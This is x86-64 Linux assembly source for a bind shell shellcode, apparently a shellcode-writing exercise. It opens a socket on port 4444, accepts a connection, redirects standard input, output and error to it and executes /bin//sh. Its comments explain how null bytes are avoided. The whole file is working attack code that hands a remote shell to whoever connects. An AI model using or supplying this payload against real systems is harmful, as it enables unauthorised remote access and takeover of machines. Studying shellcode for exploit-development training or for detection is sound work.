global _start

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

    ; To prevent nullbytes I used the push pop technique
    push 41
    pop rax
    push 2
    pop rdi
    push 1
    pop rsi
    cdq
	syscall

	; copy socket descriptor to rdi for future use 
	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

    push rdx ; sin_zero
    add dx, 0x5c11  
    shl rdx, 16
    add rdx, 2
    push rdx
    push rsp
    pop rsi

	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

    push 49
    pop rax
	
	mov rsi, rsp
    push 16
    pop rdx
	syscall


	; listen(sock, MAX_CLIENTS)
	; syscall number 50

    push 50
    pop rax
    push 2
    pop rsi
	syscall


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	
    push 43
    pop rax
	sub rsp, 16
	mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp

        syscall

	; store the client socket description 
	mov r9, rax 

        ; close parent

        push 3
        pop rax
        syscall

        ; duplicate sockets

        ; dup2 (new, old)
        mov rdi, r9
        push 33
        pop rax
        xor rsi, rsi
        syscall

        push 33
        pop rax
        push 1
        pop rsi
        syscall

        push 33
        pop rax
        push 2
        pop rsi
        syscall



        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall







	






	
	

 
